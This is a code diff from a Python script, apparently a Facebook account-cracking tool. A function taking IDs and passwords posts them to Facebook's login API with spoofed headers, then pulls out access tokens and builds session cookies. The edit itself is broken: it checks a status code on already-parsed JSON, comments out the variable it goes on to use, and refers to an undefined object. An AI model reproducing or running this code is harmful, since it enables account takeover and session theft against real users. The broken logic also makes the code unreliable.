@@ -1768,9 +1768,9 @@ def m6(ids,pwv):
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'https://api.facebook.com/auth/login'
-            response = requests.post(url,data=info,headers=update)
+            response = requests.post(url,data=info,headers=update).json()
             if response.status_code == 200:
-              json_response = response.json()
+              #json_response = response.json()
               if json_response.get('status') == 'ok':
                if 'access_token' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
